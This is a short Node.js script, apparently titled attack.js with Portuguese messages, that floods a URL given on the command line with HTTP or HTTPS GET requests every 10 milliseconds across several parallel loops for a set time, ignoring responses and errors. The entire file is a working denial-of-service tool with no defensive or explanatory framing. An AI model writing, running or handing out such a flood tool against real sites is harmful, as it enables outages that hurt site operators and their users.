const https = require('https');
const http = require('http');

const url = process.argv[2];
const tempo = parseInt(process.argv[3]) * 1000;
const threads = parseInt(process.argv[4]);

if (!url || !tempo || !threads) {
    console.log('Uso correto: node attack.js <url> <tempo-em-segundos> <threads>');
    process.exit(1);
}

console.log(`🚀 Iniciando ataque em ${url} por ${tempo / 1000}s com ${threads} threads`);

const flood = () => {
    const lib = url.startsWith('https') ? https : http;

    const interval = setInterval(() => {
        const req = lib.get(url, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', (err) => {});
        req.end();
    }, 10);

    setTimeout(() => clearInterval(interval), tempo);
};

for (let i = 0; i < threads; i++) {
    flood();
}
